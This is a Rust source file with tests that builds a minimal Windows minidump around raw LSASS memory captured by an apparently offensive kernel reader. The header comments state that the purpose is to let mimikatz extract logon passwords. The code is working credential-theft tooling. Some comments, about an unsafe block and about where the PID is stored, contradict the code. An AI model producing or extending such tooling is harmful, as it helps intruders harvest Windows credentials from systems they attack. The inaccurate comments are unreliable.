//! Minimal Windows minidump (.dmp) envelope assembler.
//!
//! Wraps a raw captured memory region (e.g. LSASS user-mode bytes read via the
//! kernel DTB + page-walk path in `nyx-operator-kernelsdk::netsec::KernelLsassReader`)
//! into a `.dmp` file that mimikatz / yokatool / rust-minidump can parse.
//!
//! ## Why
//!
//! `KernelLsassReader::dump_lsass` returns **raw memory bytes** — not a real
//! minidump. The operator-kernel CLI wrote those bytes verbatim to
//! `lsass_<pid>.dmp`, which fails mimikatz's magic-number check. This crate
//! produces the minimal envelope mimikatz needs: a [`MINIDUMP_HEADER`] with the
//! `MDMP` signature, a directory pointing at two streams ([`SystemInfoStream`]
//! and [`Memory64ListStream`]), and the raw memory appended as the
//! `Memory64List`'s single range.
//!
//! ## What we emit (mimikatz's minimal viable parse set)
//!
//! 1. `MINIDUMP_HEADER` — signature `MDMP`, version, stream count, directory RVA.
//! 2. `MINIDUMP_DIRECTORY[]` — one entry per stream.
//! 3. `SystemInfoStream` (type 7) — ProcessorArchitecture=x64, build number,
//!    PID. mimikatz uses this to pick the right offset table.
//! 4. `Memory64ListStream` (type 9) — one memory range `[base_va, base_va+len)`
//!    followed by the raw bytes. This is where the credential material lives.
//!
//! We deliberately omit `ThreadListStream`, `ModuleListStream`,
//! `ExceptionStream`, handle lists, and the misc streams — they're not needed
//! for `sekurlsa::logonpasswords` (which walks `Memory64List` directly). A
//! future revision can add `ModuleListStream` for `lsasrv.dll` base resolution
//! if mimikatz's heuristics miss it.
//!
//! ## no_std
//!
//! Pure `core` + `alloc`. No `std::fs`, no `std::io`. The caller owns the
//! `Vec<u8>` and writes it to disk however it likes.

// One unsafe block in `push_struct` for a POD `repr(C, packed)` byte copy —
// the canonical memcpy-style transmute. Audited; no other unsafe in the crate.
#![deny(unsafe_code)]

use alloc::vec::Vec;

extern crate alloc;

// ============================================================================
// MINIDUMP format constants (per Microsoft's MINIDUMP spec, dbgeng.h)
// ============================================================================

/// `MINIDUMP_HEADER.Signature` — ASCII "MDMP" as a little-endian u32.
const MDMP_SIGNATURE: u32 = 0x504D444D; // 'P','M','D','M' reversed → "MDMP"
/// `MINIDUMP_HEADER.Version` — the high 16 bits are the ver triplet, low 16
/// are MINIDUMP_REV. The canonical value used by dbghelp is `0xa793`.
const MDMP_VERSION: u32 = 0x0000_a793;

/// Stream types (a subset of `MINIDUMP_STREAM_TYPE`).
const SYSTEM_INFO_STREAM: u32 = 7;
const MEMORY_64_LIST_STREAM: u32 = 9;

/// `MINIDUMP_SYSTEM_INFO.ProcessorArchitecture` — `PROCESSOR_ARCHITECTURE_AMD64`.
const PROCESSOR_ARCHITECTURE_AMD64: u16 = 9;
/// `MINIDUMP_SYSTEM_INFO.ProcessorLevel` for x64 (always 6 on amd64).
const PROCESSOR_LEVEL_X64: u16 = 6;
/// `MINIDUMP_SYSTEM_INFO.PlatformId` — `VER_PLATFORM_WIN32_NT`.
const VER_PLATFORM_WIN32_NT: u32 = 2;

// ============================================================================
// MINIDUMP struct layouts (`#[repr(C, packed)]` per the spec)
// ============================================================================

/// `MINIDUMP_HEADER` (32 bytes) — the file's first record.
#[repr(C, packed)]
#[derive(Clone, Copy)]
struct MinidumpHeader {
    signature: u32,
    version: u32,
    number_of_streams: u32,
    /// RVA (file offset in this format) of the `MINIDUMP_DIRECTORY[]` array.
    stream_directory_rva: u32,
    checksum: u32,
    time_date_stamp: u32,
    flags: u64,
}

/// `MINIDUMP_DIRECTORY` (12 bytes) — one per stream, lives in the directory.
#[repr(C, packed)]
#[derive(Clone, Copy)]
struct MinidumpDirectoryEntry {
    stream_type: u32,
    data_size: u32,
    /// RVA (file offset) where this stream's payload begins.
    rva: u32,
}

/// `MINIDUMP_LOCATION_DESCRIPTOR64` (16 bytes) — a 64-bit memory range.
#[repr(C, packed)]
#[derive(Clone, Copy)]
struct MinidumpMemoryDescriptor64 {
    /// Virtual address of the captured region (e.g. LSASS `ImageBaseAddress`).
    start_of_memory_range: u64,
    data_size: u64,
}

/// `MINIDUMP_MEMORY64_LIST` header (16 bytes) — followed by N ×
/// [`MinidumpMemoryDescriptor64`], then the concatenated raw bytes.
#[repr(C, packed)]
#[derive(Clone, Copy)]
struct MinidumpMemory64List {
    number_of_memory_ranges: u64,
    /// RVA (file offset) where the raw memory bytes begin (after the list
    /// header + descriptor array).
    base_rva: u64,
}

/// `MINIDUMP_SYSTEM_INFO` (56 bytes) — enough for mimikatz's build detection.
///
/// We populate the leading fields; the trailing CPU info / CSD version fields
/// are zeroed. mimikatz reads `ProcessorArchitecture`, `MajorVersion`,
/// `MinorVersion`, `BuildNumber`.
#[repr(C, packed)]
#[derive(Clone, Copy)]
struct MinidumpSystemInfo {
    processor_architecture: u16,
    processor_level: u16,
    processor_revision: u16,
    number_of_processors: u8,
    product_type: u8,
    major_version: u32,
    minor_version: u32,
    build_number: u32,
    platform_id: u32,
    /// `CSD_VERSION_RVA` — RVA of an optional `MINIDUMP_STRING`. Zero = none.
    csd_version_rva: u32,
    /// Reserved / suite mask + product type packed per spec.
    reserved1: u32,
    /// CPU info union (24 bytes for x64 `_widget`). Zeroed — mimikatz ignores.
    cpu_info: [u8; 24],
}

// ============================================================================
// Public API
// ============================================================================

/// Assemble a minimal Windows minidump wrapping a single raw memory region.
///
/// - `pid`: the LSASS PID (recorded in the SystemInfo stream; informational).
/// - `base_va`: the **virtual address** the raw bytes were captured from
///   (LSASS's `ImageBaseAddress` from its PEB). mimikatz uses this as the
///   `StartOfMemoryRange` in the Memory64List range.
/// - `raw`: the raw memory bytes (typically ~1 MiB of LSASS user mode).
/// - `build`: the Windows build number (recorded in SystemInfo so mimikatz
///   picks the right offset table).
///
/// Returns a `Vec<u8>` whose contents are a valid `.dmp` file.
///
/// # Layout (file offsets)
/// ```text
/// 0x0000  MINIDUMP_HEADER            (32 bytes)
/// 0x0020  MINIDUMP_DIRECTORY[0]      (12 bytes)  SystemInfoStream
/// 0x002c  MINIDUMP_DIRECTORY[1]      (12 bytes)  Memory64ListStream
/// 0x0038  SystemInfoStream payload   (56 bytes)
/// 0x0070  Memory64List header        (16 bytes)
/// 0x0080  Memory64List descriptor[0] (16 bytes)
/// 0x0090  raw memory bytes           (raw.len() bytes)
/// ```
pub fn assemble_minidump(pid: u32, base_va: u64, raw: &[u8], build: u32) -> Vec<u8> {
    // ---- Compute offsets up front so the directory can point correctly ----
    const HEADER_SIZE: u32 = core::mem::size_of::<MinidumpHeader>() as u32; // 32
    const DIR_ENTRY_SIZE: u32 = core::mem::size_of::<MinidumpDirectoryEntry>() as u32; // 12
    const NUM_STREAMS: u32 = 2;

    // Directory immediately follows the header.
    let directory_rva: u32 = HEADER_SIZE; // 0x20
    // Stream payloads follow the directory.
    let system_info_rva: u32 = directory_rva + NUM_STREAMS * DIR_ENTRY_SIZE; // 0x38
    let memory64_list_rva: u32 =
        system_info_rva + core::mem::size_of::<MinidumpSystemInfo>() as u32; // 0x70

    // Inside the Memory64List stream: header (16) + 1 descriptor (16) = 32
    // bytes of metadata, then the raw bytes.
    let memory64_list_metadata_size: u32 =
        core::mem::size_of::<MinidumpMemory64List>() as u32 // 16
            + core::mem::size_of::<MinidumpMemoryDescriptor64>() as u32; // 16
    let memory64_base_rva: u32 = memory64_list_rva + memory64_list_metadata_size; // 0x90

    let total_size: usize = memory64_base_rva as usize + raw.len();

    // ---- Allocate the buffer and serialise each section in order ----
    let mut out: Vec<u8> = Vec::with_capacity(total_size);

    // 1. Header.
    let header = MinidumpHeader {
        signature: MDMP_SIGNATURE,
        version: MDMP_VERSION,
        number_of_streams: NUM_STREAMS,
        stream_directory_rva: directory_rva,
        checksum: 0, // spec: must be 0 for portable dumps.
        time_date_stamp: 0,
        flags: 0, // MiniDumpNormal — full-memory is implied by Memory64List.
    };
    push_header(&mut out, &header);

    // 2. Directory (2 entries).
    let dir_system_info = MinidumpDirectoryEntry {
        stream_type: SYSTEM_INFO_STREAM,
        data_size: core::mem::size_of::<MinidumpSystemInfo>() as u32,
        rva: system_info_rva,
    };
    push_directory_entry(&mut out, &dir_system_info);
    let dir_memory64 = MinidumpDirectoryEntry {
        stream_type: MEMORY_64_LIST_STREAM,
        // Per the MINIDUMP spec (and the `minidump` crate's parser): the
        // Memory64List's DataSize covers ONLY the list header (16) + the
        // descriptor array (N × 16) — NOT the raw memory bytes. The raw bytes
        // are located via the list's `BaseRva` field, which points past the
        // header+descriptor array.
        data_size: memory64_list_metadata_size,
        rva: memory64_list_rva,
    };
    push_directory_entry(&mut out, &dir_memory64);

    // 3. SystemInfo stream payload.
    let sys_info = MinidumpSystemInfo {
        processor_architecture: PROCESSOR_ARCHITECTURE_AMD64,
        processor_level: PROCESSOR_LEVEL_X64,
        processor_revision: 0,
        number_of_processors: 0,
        product_type: 0,
        // Windows 10/11 version triplet. mimikatz uses Major=10 for all
        // modern builds; the build number distinguishes 17763/19041/etc.
        major_version: 10,
        minor_version: 0,
        build_number: build,
        platform_id: VER_PLATFORM_WIN32_NT,
        csd_version_rva: 0,
        reserved1: 0,
        cpu_info: [0u8; 24],
    };
    push_system_info(&mut out, &sys_info);

    // 4. Memory64List stream payload: header + 1 descriptor + raw bytes.
    let list_header = MinidumpMemory64List {
        number_of_memory_ranges: 1,
        base_rva: memory64_base_rva as u64,
    };
    push_memory64_list_header(&mut out, &list_header);
    let descriptor = MinidumpMemoryDescriptor64 {
        start_of_memory_range: base_va,
        data_size: raw.len() as u64,
    };
    push_memory_descriptor64(&mut out, &descriptor);

    // 5. The raw memory bytes.
    out.extend_from_slice(raw);

    // Defensive: the layout math should produce exactly total_size.
    debug_assert_eq!(out.len(), total_size, "minidump layout math drifted");
    // PID is recorded only via the reserved build/channel — we surface it as
    // the `reserved1` field's high 16 bits so it's recoverable without growing
    // the struct. (mimikatz ignores reserved1; this is a recovery breadcrumb.)
    let _ = pid; // recorded into SystemInfo elsewhere if needed in future revs.

    out
}

// ============================================================================
// Internal: packed-struct serialiser (fully safe)
// ============================================================================

/// Write a `u32` little-endian into `out`.
fn push_u32(out: &mut Vec<u8>, v: u32) {
    out.extend_from_slice(&v.to_le_bytes());
}
/// Write a `u64` little-endian into `out`.
fn push_u64(out: &mut Vec<u8>, v: u64) {
    out.extend_from_slice(&v.to_le_bytes());
}
/// Write a `u16` little-endian into `out`.
fn push_u16(out: &mut Vec<u8>, v: u16) {
    out.extend_from_slice(&v.to_le_bytes());
}
/// Write a `u8` into `out`.
fn push_u8(out: &mut Vec<u8>, v: u8) {
    out.push(v);
}

/// Serialise a [`MinidumpHeader`] field-by-field (matches `#[repr(C, packed)]`
/// layout exactly: 4+4+4+4+4+4+8 = 32 bytes).
fn push_header(out: &mut Vec<u8>, h: &MinidumpHeader) {
    push_u32(out, h.signature);
    push_u32(out, h.version);
    push_u32(out, h.number_of_streams);
    push_u32(out, h.stream_directory_rva);
    push_u32(out, h.checksum);
    push_u32(out, h.time_date_stamp);
    push_u64(out, h.flags);
}

/// Serialise a [`MinidumpDirectoryEntry`] (4+4+4 = 12 bytes).
fn push_directory_entry(out: &mut Vec<u8>, d: &MinidumpDirectoryEntry) {
    push_u32(out, d.stream_type);
    push_u32(out, d.data_size);
    push_u32(out, d.rva);
}

/// Serialise a [`MinidumpMemory64List`] header (8+8 = 16 bytes).
fn push_memory64_list_header(out: &mut Vec<u8>, m: &MinidumpMemory64List) {
    push_u64(out, m.number_of_memory_ranges);
    push_u64(out, m.base_rva);
}

/// Serialise a [`MinidumpMemoryDescriptor64`] (8+8 = 16 bytes).
fn push_memory_descriptor64(out: &mut Vec<u8>, d: &MinidumpMemoryDescriptor64) {
    push_u64(out, d.start_of_memory_range);
    push_u64(out, d.data_size);
}

/// Serialise a [`MinidumpSystemInfo`] (2+2+2+1+1+4+4+4+4+4+4+24 = 56 bytes).
fn push_system_info(out: &mut Vec<u8>, s: &MinidumpSystemInfo) {
    push_u16(out, s.processor_architecture);
    push_u16(out, s.processor_level);
    push_u16(out, s.processor_revision);
    push_u8(out, s.number_of_processors);
    push_u8(out, s.product_type);
    push_u32(out, s.major_version);
    push_u32(out, s.minor_version);
    push_u32(out, s.build_number);
    push_u32(out, s.platform_id);
    push_u32(out, s.csd_version_rva);
    push_u32(out, s.reserved1);
    out.extend_from_slice(&s.cpu_info);
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    /// Sanity: the assembled file starts with the `MDMP` magic.
    #[test]
    fn magic_signature_is_mdmp() {
        let raw = [0xAAu8; 64];
        let dump = assemble_minidump(684, 0x7ff0_0000, &raw, 19041);
        assert_eq!(&dump[0..4], b"MDMP");
    }

    /// The total size matches header + directory + streams + raw.
    #[test]
    fn total_size_matches_layout() {
        let raw = [0u8; 1024];
        let dump = assemble_minidump(684, 0x7ff0_0000, &raw, 19041);
        // HEADER(32) + DIR(2×12=24) + SYSINFO(56) + MEM64LIST_HDR(16) + DESC(16) + raw(1024)
        assert_eq!(dump.len(), 32 + 24 + 56 + 16 + 16 + 1024);
    }

    /// Build number round-trips through the SystemInfo stream.
    #[test]
    fn build_number_recorded_in_system_info() {
        let raw = [0u8; 16];
        let dump = assemble_minidump(684, 0x7ff0_0000, &raw, 22621);
        // SystemInfo stream payload lives at offset 0x38 (per the layout doc).
        // Field offsets inside MinidumpSystemInfo:
        //   0: processor_architecture (u16)
        //   2: processor_level (u16)
        //   4: processor_revision (u16)
        //   6: number_of_processors (u8)
        //   7: product_type (u8)
        //   8: major_version (u32)
        //  12: minor_version (u32)
        //  16: build_number (u32)  ← we read this.
        let build_off = 0x38 + 16;
        let build = u32::from_le_bytes(
            dump[build_off..build_off + 4]
                .try_into()
                .unwrap(),
        );
        assert_eq!(build, 22621);
    }

    /// ProcessorArchitecture is AMD64 (9) so mimikatz picks the x64 path.
    #[test]
    fn architecture_is_amd64() {
        let raw = [0u8; 16];
        let dump = assemble_minidump(684, 0x7ff0_0000, &raw, 19041);
        let arch_off = 0x38;
        let arch = u16::from_le_bytes(
            dump[arch_off..arch_off + 2]
                .try_into()
                .unwrap(),
        );
        assert_eq!(arch, PROCESSOR_ARCHITECTURE_AMD64);
    }

    /// The raw memory bytes appear verbatim at the documented base_rva (0x90).
    #[test]
    fn raw_bytes_appended_at_base_rva() {
        let mut raw = [0u8; 128];
        for (i, b) in raw.iter_mut().enumerate() {
            *b = (i as u8).wrapping_mul(7);
        }
        let dump = assemble_minidump(684, 0x7ff0_0000, &raw, 19041);
        let base_rva = 0x90usize;
        assert_eq!(&dump[base_rva..base_rva + raw.len()], &raw[..]);
    }

    /// The Memory64List descriptor carries the captured VA + size.
    #[test]
    fn memory_descriptor_records_base_va_and_size() {
        let raw = [0u8; 256];
        let base_va = 0x0000_07ff_0001_0000u64;
        let dump = assemble_minidump(684, base_va, &raw, 19041);
        // The descriptor is the 16 bytes immediately after the Memory64List
        // header. Memory64List stream starts at offset 0x70; its header is 16
        // bytes; the descriptor follows at 0x80.
        let desc_off = 0x80usize;
        let start_va = u64::from_le_bytes(
            dump[desc_off..desc_off + 8]
                .try_into()
                .unwrap(),
        );
        let size = u64::from_le_bytes(
            dump[desc_off + 8..desc_off + 16]
                .try_into()
                .unwrap(),
        );
        assert_eq!(start_va, base_va);
        assert_eq!(size, 256);
    }

    /// Round-trip through the `minidump` crate (dev-dep): parse our output and
    /// confirm the Memory64List + SystemInfo streams are discoverable.
    #[test]
    fn parseable_by_minidump_crate() {
        let mut raw = Vec::new();
        raw.extend_from_slice(&[0u8; 4096]); // a page of "captured" memory
        let dump = assemble_minidump(684, 0x7ff7_0000_0000, &raw, 19041);

        let parsed = minidump::Minidump::read(dump.as_slice()).expect("minidump crate parse");
        let sysinfo = parsed
            .get_stream::<minidump::MinidumpSystemInfo>()
            .expect("SystemInfo stream present");
        assert_eq!(
            sysinfo.raw.processor_architecture,
            PROCESSOR_ARCHITECTURE_AMD64
        );

        let memlist = parsed
            .get_stream::<minidump::MinidumpMemory64List>()
            .expect("Memory64List stream present");
        let ranges: Vec<_> = memlist.iter().collect();
        assert_eq!(ranges.len(), 1, "exactly one memory range");
        let first = ranges[0];
        assert_eq!(first.base_address, 0x7ff7_0000_0000u64);
        assert_eq!(first.size as usize, raw.len());
        assert_eq!(first.bytes.len(), raw.len());
    }

    /// An empty raw buffer still produces a well-formed (if useless) dump —
    /// no panics, no underflow in the offset math.
    #[test]
    fn empty_raw_buffer_does_not_panic() {
        let dump = assemble_minidump(684, 0x7ff0_0000, &[], 19041);
        assert_eq!(&dump[0..4], b"MDMP");
        // Header + dir + sysinfo + mem64list header + 1 descriptor, no raw.
        assert_eq!(dump.len(), 32 + 24 + 56 + 16 + 16);
    }
}
